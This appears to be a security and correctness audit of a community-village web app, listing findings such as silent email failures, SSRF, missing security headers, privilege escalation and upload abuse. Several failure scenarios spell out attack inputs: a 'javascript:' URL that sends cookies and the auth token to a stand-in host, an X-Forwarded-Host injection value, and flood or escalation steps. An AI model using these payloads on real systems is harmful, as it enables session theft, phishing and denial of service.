- **What:** sendResendEmail (index.ts:1855) swallows every failure — a missing key returns silently, a non-2xx or a thrown fetch only console.error's — and both notify paths then stamp emailed_at (notify.ts:174 for immediate, 216 for the digest). Nothing counts failures, nothing calls notifyAdmins or reportError, and the digest query filters on `emailed_at IS NULL`, so a stamped row is never retried.
- **Failure:** The Resend API key is rotated, or Resend returns 429 for an hour. Every notification generated in that window — "Your stay credits have run out", "'chainsaw' was due 6 days ago", the partial-refund and settle-failure admin alerts — is marked emailed_at and never sent again. The app reports success, the admin dashboard shows nothing wrong, and the first sign is a member arriving at reception with a negative stay balance they were never told about. This is the same "a log line nobody reads" failure mode server/lib/errors.ts was written to eliminate, on the one channel members actually depend on.

### GET /api/network/published serves shared items publicly at `preview` lifecycle, contradicting the framework's rule that preview hides a module's existence from non-admins
- **Where:** `server/index.ts:5357` · lens: ?
- **What:** requireModule() (server/lib/modules.ts:174) treats preview as admin-only and answers 404 to everyone else specifically so that "the catalog of what a village is trying out never leaks". /api/network/published is deliberately registered before app.use("/api/network", requireModule("network")) at line 5374 and refuses only the `off` state, so at preview it publishes shared_items — including the free-text `contact` field — to the whole internet.
- **Failure:** Stewards set the network module to preview to see how federation looks before deciding, and add three test items with a real phone number in `contact`. `curl https://village/api/network/published` returns those items plus the instanceId and village name to anyone, and any peer village polling the endpoint ingests them as live offers — while the village believes the module is still private to admins.

### The runbook's Gate D rename instruction breaks the ledger, because the token slug also lives in a code literal it never mentions
- **Where:** `docs/FORK_RUNBOOK.md:76` · lens: ?
- **What:** Gate D step 1 says to rename the recognition token "in the `tokens` table row, in `shared/gameConfig.ts`, and in the brand overlay — all three, or the UI and the ledger disagree." But the slug is also `server/lib/ledger.ts:49` (`export const PLATFORM_TOKEN: TokenType = "gratitude"`) and the faucet id `RECOGNITION_FAUCET = "sys:gratitude-pool"` (ledger.ts:52) — both in a HARD-CLEAN zone that `check-brand-refs.mjs` passes because "gratitude" is not in its BANNED list. The runbook lists three places; there are five.
- **Failure:** Village #2 calls its recognition token "Thanks". Following Gate D literally, an admin runs `UPDATE tokens SET slug='thanks', name='Thanks' WHERE slug='gratitude'` and edits gameConfig + the overlay. The next gratitude send calls `postTransfer` with no explicit `tokenType`, so `validateLeg` (ledger.ts:192) defaults to `PLATFORM_TOKEN = "gratitude"`, `tokenDef("gratitude")` returns undefined, and every send fails with `unknown token "gratitude" — register it in the token registry before posting`. The core recognition module — one of the four that "cannot be disabled" — is dead, following documented instructions, with an error message that points at the wrong cause.

### The feedback relay is the one outbound call that skips the pinned-IP dialer, so it accepts plaintext HTTP and unvetted redirects
- **Where:** `server/lib/feedback.ts:107` · lens: ?
- **What:** `relayFeedback` calls bare `fetch(hubUrl, {method:"POST", …})`. Every other outbound path uses `guardedFetchJson` — `server/lib/errors.ts:91` does it for `ERROR_WEBHOOK_URL` with the comment "an admin-settable URL is exactly the shape SSRF lives in", `server/lib/network.ts:38` refuses bare fetch for peers, and FORK_RUNBOOK's `ERROR_WEBHOOK_URL` row promises outbound calls are "dialled through the pinned-IP guard like every other outbound call." Bare fetch skips the https-only check (toolcheck.ts:142), the range check, and the by-hand per-hop redirect re-guard, and follows redirects with a fresh DNS resolution per hop.
- **Failure:** An operator sets `FEEDBACK_HUB_URL=http://hub.internal/api/feedback/ingest` for a self-hosted hub. Every 15 minutes the village POSTs up to 50 items of unredacted member free text — a village's bug and idea queue routinely contains "the tool shed lock is broken and Marco keeps taking the chainsaw" — in cleartext over the network. Separately, an https hub that 302-redirects lands the same POST at `http://169.254.169.254/…` or a private-range host with no per-hop guard, which is precisely the class `toolcheck.ts` was written to close.

### A failed module-manifest fetch is rendered as "module off", so a network blip shows the member a 404 for their own wallet
- **Where:** `client/src/modules/ModuleProvider.tsx:58` · lens: ?
- **What:** The catch handler sets loaded: true while leaving modules: [], and every module page gates on exactly that pair — Wallet.tsx:45, Library.tsx:41, Forum.tsx:31, Stay.tsx:48, Feed.tsx:75 and Contribute.tsx:58 all do `if (modules.loaded && !X) return <NotFound />`. There is no retry: refresh() runs once from useEffect, so the state persists until a full page reload.
- **Failure:** A member on a flaky rural link taps Wallet. /api/modules times out, the catch fires, loaded becomes true with an empty module list, and they are shown "Page not found" for the page that holds their own token balances — indistinguishable from the stewards having switched the exchange off. They navigate to Library and Forum and get the same 404, and nothing recovers until they know to hard-reload.

### firstName() takes the first whitespace token as a person's name, which is the family name across much of the world and there is no display-name field to override it
- **Where:** `server/index.ts:1456` · lens: ?
- **What:** firstName(name) returns name.trim().split(/\s+/)[0] and is the display path for roughly twenty member-facing surfaces: activity/pulse lines (1266, 1825, 3031, 9200, 9269, 9807), forum author names (3428, 3581, 3664, 3673), notification titles (3494, 4182, 9273), the contact-relay email body (4171-4172), gratitude wall entries (9288) and role refusals (9790). grep finds no display_name, preferred_name or displayName column anywhere — users has only `name` and `handle`.
- **Failure:** A Vietnamese village has members Nguyễn Văn An, Nguyễn Thị Bình and Nguyễn Minh Châu. Every one of them appears as "Nguyễn" on the gratitude wall, in the activity pulse, as the forum post author and in notification titles ("Nguyễn sent you appreciation"), so the recognition record — the thing the platform exists to keep — cannot say which of three people was thanked, and each is addressed by family name rather than by their name. The same code renders a Costa Rican "María José García" as "María".

### stage_events, the only record of a member's progression, is capped at 2000 rows by DELETE-all + re-INSERT — older advancement history is destroyed
- **Where:** `server/index.ts:1265` · lens: ?
- **What:** `recordStageEvent` reads the whole `stage_events` cache, pushes one row, and calls `stageEventsRepo.replaceAll(events.slice(-2000))` — a `DELETE FROM stage_events` followed by re-inserting only the newest 2000. Rows past the cap are permanently deleted with no archive, no audit event, and no notice. Migration 0003's own rationale for the table is that "advancement previously left no trace: a profile could not show 'you reached Contributor and this opened'", and `/api/profile/export` (index.ts:9951) serves `stageEventsRepo.all()` as part of the member's data-rights export. The write also carries the same lost-update race as the role-holder path: the snapshot is taken before two awaits (`addActivity`, `notify`) that follow the replaceAll... and before `replaceAll` itself.
- **Failure:** A village of 300 members over eight years accumulates roughly 5 advancement events each, exceeding 2000. The 2001st advancement deletes the founding members' earliest stage events. Those members' profiles and their /api/profile/export files no longer contain the record of when they became Contributors or what that unlocked, and there is no way to recover it — the rows were deleted, not superseded, which is the opposite of the posture 0040 established for regen_entries.

### A warning badge can be awarded with an expiry the platform silently treats as already-expired, so the capability suspension never takes effect while every surface reports it did
- **Where:** `server/index.ts:6953` · lens: ?
- **What:** The award route accepts `expiresAt` from the request body and only rejects it if `new Date(...)` is NaN — no check that it is in the future, and no check against MySQL's TIMESTAMP upper bound of 2038-01-19 (drizzle/0023 declares `badge_awards.expires_at` as `timestamp NULL`). Every read filters with `(a.expires_at IS NULL OR a.expires_at > NOW())` (index.ts:6753, 6788, 6816) and server/lib/badges.ts:148 resolves `denies` through the same filter, so a past date — or an out-of-range date stored as a zero timestamp on a non-strict connection — makes the row invisible to the capability gate. The route still returns `{success: true}`, still sends the member "A warning was placed: …", and still writes the `badge:warning-reissue` audit event.
- **Failure:** A steward places a warning badge that denies `forum.post` on a member after a harmful thread, and types 2025-08-01 in the expiry field instead of 2027-08-01 (or 2040 for a long suspension). upsertAward writes the row; the member is notified that a warning was placed; the audit trail records it; the admin UI shows success. But `expires_at > NOW()` is false, so badgesFor never returns the badge, the deny is never applied, and the member keeps posting. Everyone — the reporter, the stewards, the audit log — believes a suspension is in force that the gate has never seen.

### No Content-Security-Policy, X-Frame-Options, HSTS or Referrer-Policy is set anywhere, while the session bearer token lives in localStorage
- **Where:** `server/index.ts:2777` · lens: ?
- **What:** The only setHeader calls in the whole server are Content-Type/Content-Disposition on the CSV export, the /api/uploads handler (which does set nosniff), and the profile export. There is no helmet, no CSP, no frame-ancestors, no HSTS. Meanwhile client/src/contexts/AuthContext.tsx:85 stores the auth token in `localStorage["amora-auth-token"]`, so any script execution in the origin is total account takeover with no cookie flags to hide behind. The /api/uploads handler's own comment (server/index.ts:8574) reasons carefully about "a file that the browser decides to execute runs with the village's cookies and localStorage" — that reasoning is applied to one route and to nothing else. A CSP with `script-src 'self'` and no `javascript:` would neutralise both href findings above; its absence is what turns them from annoyances into token theft.
- **Failure:** Any injected URL or future markdown/HTML feature yields full session theft: `<a href="javascript:...">` (see the hypha and zeffy findings) executes, reads localStorage, and POSTs the token off-origin — nothing blocks the outbound request. Separately, with no X-Frame-Options/frame-ancestors, an attacker frames /admin on their own page and clickjacks a logged-in steward into pressing "Award badge" or "Close cycle", both of which are single-click, no-confirm mutations that move value.

### Admin-typed URLs for Zeffy products, training modules and visit/investor CTAs are stored and rendered into href with no scheme validation, while tools.url is validated
- **Where:** `server/index.ts:5303` · lens: ?
- **What:** validateToolBody() (server/index.ts:4337-4346) correctly rejects any tool link that is not `https:`. Four sibling fields have no equivalent check: (a) `zeffyUrl` is stored as `String(b.zeffyUrl ?? "").slice(0, 500)` at index.ts:5303, returned to the browser at index.ts:5231, and rendered at client/src/pages/Contribute.tsx:104; (b) training-module `url` is stored as `url ?? ""` at index.ts:8686 with no String() and no scheme test, rendered at client/src/pages/Training.tsx:176; (c) `cta_url` in the Visit config and the Investor summary reach client/src/pages/Visit.tsx:112 and client/src/components/InvestorSummary.tsx:96. React escapes the attribute value but does not filter the scheme, so `javascript:` survives.
- **Failure:** An admin creates a commerce product with provider=zeffy and Zeffy form URL `javascript:location='https://x.example/?c='+document.cookie+localStorage.amora-auth-token`. /contribute is a PUBLIC page and the checkout POST is unauthenticated. Any visitor or member taps "Give via Zeffy", the server answers `{kind:"zeffy", url: "javascript:..."}`, Contribute.tsx renders it as the "Continue to Zeffy" button, and the click executes in the village's origin. The training-module case is the same shape and reaches every member on /training.

### Two public endpoints build admin email links from the attacker-controlled X-Forwarded-Host header, and one interpolates it into an href unescaped
- **Where:** `server/index.ts:8597` · lens: ?
- **What:** Every other email link uses `notifyDeps.origin()` (index.ts:1533), which reads FRONTEND_URL. Two handlers do not: POST /api/forms/submit (index.ts:2846) and POST /api/investor-docs/request (index.ts:8597) both compute `origin` from `req.headers["x-forwarded-host"] ?? req.headers.host` and `x-forwarded-proto`. Both are unauthenticated. In buildSubmissionEmailHtml the value is at least passed through escapeHtml; in the investor-docs handler at index.ts:8607 `${origin}` is interpolated raw into `href="${origin}/api/uploads/..."` and `href="${origin}${escapeHtml(d.pageLink)}"`, so the header can also break out of the attribute.
- **Failure:** An attacker POSTs `{name:"Ana",email:"ana@attacker.example",accredited:true}` to /api/investor-docs/request with header `X-Forwarded-Host: amora-investors.attacker.example`. recipientsForType("investor-doc-request") fires an email to the village's investor inbox, sent from the village's own verified Resend domain, whose "Open Admin" button points at `https://amora-investors.attacker.example/admin` — a credential-harvest page reached from a message the steward has every reason to trust. Passing `X-Forwarded-Host: x" style=display:none x="` instead injects arbitrary attributes into the document-list anchors of the same email.

### The submissions retention sweep deletes the record but never the uploaded attachment, which stays publicly downloadable forever
- **Where:** `server/index.ts:1607` · lens: ?
- **What:** runRetentionSweep() honours `retention.submissions_days` (shared/gameVariables.ts:321) by filtering submissionsRepo and calling replaceAll — a row-level purge only. Nothing in the sweep touches UPLOADS_DIR; the only unlink calls in the server are the investor-vault delete (index.ts:8547) and the failed-auth cleanup at index.ts:8513. Files written by POST /api/work-with-us/attachment (index.ts:8395, unauthenticated) are named `proposal-<ms>-<5 chars><ext>` and served by GET /api/uploads/:filename (index.ts:8560), which has no authentication of any kind. So the purge destroys the only index of the file while leaving the file itself retrievable.
- **Failure:** A prospective resident attaches a scanned passport page and a CV to a Work With Us proposal. `retention.submissions_days` is set to 90; on day 91 the sweep drops the submission row, and with it the admin UI's only reference (Admin.tsx:783 renders the link from the row). The two files remain in the mounted volume and remain downloadable, without login, by anyone who still holds the URL — the submitter's email thread, a forwarded message, a proxy log, a browser history sync. The village believes it deleted the data; it deleted the receipt.

### The investor-doc upload runs multer with a 50MB limit and no file-type filter BEFORE the admin check, so unauthenticated requests write to the shared volume
- **Where:** `server/index.ts:8494` · lens: ?
- **What:** `app.post("/api/admin/investor-docs/upload", upload.single("file"), async (req, res) => { if (!(await isAdmin(req))) ... })` — the middleware runs first, so the body is fully streamed to disk before authorisation is evaluated. That multer instance (index.ts:8464) has `limits: { fileSize: 50 * 1024 * 1024 }` and NO fileFilter, and the route carries no overLimit() guard (unlike /api/work-with-us/attachment, which at least rate-limits). The handler does unlink on auth failure, but only after the write completes. The blanket /api/admin audit middleware at index.ts:2785 is not an authorisation gate.
- **Failure:** An unauthenticated attacker sends 20 concurrent POSTs of 50MB multipart bodies to /api/admin/investor-docs/upload in a loop. Each is written into the Railway volume at DATA_DIR/uploads before the 401, and the unlinks lag behind the writes; sustained concurrency keeps ~1GB of transient files resident and saturates volume write IO. The volume that holds every brand image and every proposal attachment fills, so fs.writeFileSync at index.ts:8468 and the multer destinations start throwing, and the village's uploads stop working — from a request that was never authorised.

### The land's regen ledger accepts a caller-supplied unit and sums across units, so the funder-facing impact total mixes acres with hectares
- **Where:** `server/lib/health.ts:283` · lens: ?
- **What:** docs/modules/health-dashboard.md:67 specifies `unit` as "denormalized from registry at write". The route instead takes it from the request body verbatim — `String(unit ?? def.unit).slice(0, 32)` (server/index.ts:6269) — and the admin form offers a free-text Unit input with the canonical unit only as a faint placeholder (client/src/pages/Admin.tsx:4753-4755). regenTotals then does `SUM(value) ... MAX(unit) GROUP BY metric_key` (health.ts:283), so entries in different units are added together and labelled with whichever unit string sorts highest. There is no validation, no warning and no per-unit split anywhere.
- **Failure:** The land steward records `hectares_restored` = 12 and, thinking in local terms, types "acres" in the Unit box. A second steward later records 4 with the placeholder default "ha". `/api/health/regen` — the public, outward-facing impact feed the code comment says "the village carries to funders and to Hypha" — reports **16 ha in restoration**, an overstatement of about 7 ha, with no indication that two units were blended. The retraction flow cannot fix it: retracting the acres entry removes 12 ha of real restoration from the total instead of correcting a unit.

### Accommodation capacity is collected and then enforced nowhere, and the over-capacity flag the stays contract promises does not exist
- **Where:** `server/index.ts:4728` · lens: ?
- **What:** `capacity` is written at creation (index.ts:4682) and editable (4692), and that is the end of it. POST /api/stays/request (4585-4606) checks only guest-booking and a 5/day rate limit; POST /api/admin/stays/:id/activate (4728-4756) checks only status and that a credit rate is posted. GET /api/admin/stays (4654-4673) returns accommodations and stays with balances but computes no occupancy and no flag, and the client never reads `capacity` outside the room-creation form. docs/modules/stays.md:35 defines capacity as "concurrent stays before the admin sees an over-capacity flag", :104 documents the occupancy list as returning "over-capacity flags", and :176 accepts soft overselling only on the condition that "the admin UI must show the flag loudly so it is a choice, not a surprise". None of it shipped.
- **Failure:** The village lists "Casita" with capacity 1. Ana requests it for 1 August and a steward activates her stay. Bruno requests the same Casita for the same week; the admin Stays tab shows his row exactly like Ana's, with no occupancy count and nothing marking Casita as taken, so the steward clicks Activate. Both stays are active, both burn stay-credit nights nightly against one bed, and neither the stewards nor the two members learn about it until Bruno arrives in Costa Rica after an international flight and there is nowhere to sleep. Nothing in the system can even answer "is Casita free" — there is no depart date and no occupancy read.

### A non-admin decider can appoint anyone to any role, including roles carrying capabilities the appointer does not hold
- **Where:** `server/index.ts:9780` · lens: ?
- **What:** POST /api/admin/roles/:id/holders lets any holder of `proposal.decide` appoint (index.ts:9766-9787). Its two deliberate guards are no self-appointment (compared on `userId === actorUser.id`) and no removals. Nothing else is checked: not that the target role's capabilities are a subset of the appointer's, not that the appointer holds any relationship to the role, and there is no second signature. Because `hasCapability` grants role capabilities above badge grants and stage (shared/capabilities.ts:110), the appointee immediately holds everything that role carries. The seeded Founders Circle holds `proposal.decide` (server/seeds/roles-seed.json:6).
- **Failure:** Kai holds Founders Circle, so `proposal.decide`, but is not an admin and cannot touch the treasury. The village has created a "Treasury Keys" role carrying `exchange.manage` (documented as role-only: list tokens, post prices, stock the treasury). Kai registers a second account at kai+2@example.com, gets it to member stage, then POSTs {userId: puppet, action: "add"} to /api/admin/roles/treasury-keys/holders. The self-appointment guard passes — the id differs — and no admin is asked. Kai now controls an account that can post exchange prices and stock the treasury, a capability Kai never held and that no admin granted. The only trace is one pulse line saying a member joined a circle.


## LOW (1)

### markNotificationsRead expands an unbounded caller-supplied id array into a single IN (...) list
- **Where:** `server/lib/notify.ts:255` · lens: ?
- **What:** POST /api/notifications/read (server/index.ts:7983) does `Array.isArray(req.body?.ids) ? req.body.ids.map(String) : undefined` with no length cap and no per-id length cap, and passes it to markNotificationsRead, which builds `id IN (${ids.map(() => "?").join(",")})`. The only ceiling is the global `express.json({ limit: "1mb" })`. The endpoint is authenticated but has no overLimit() guard, unlike nearly every other member-facing mutation in this file.
- **Failure:** A signed-in member POSTs `{"ids": [ ...250,000 two-character strings... ]}` (about 1MB). The server builds a single UPDATE statement with 250,000 placeholders and a 250,000-element parameter array, serialises a multi-megabyte query onto the connection, and MySQL parses it — repeat in a loop from one account to hold pool connections and CPU. Nothing rate-limits it, so one member can degrade the database the whole village runs on.

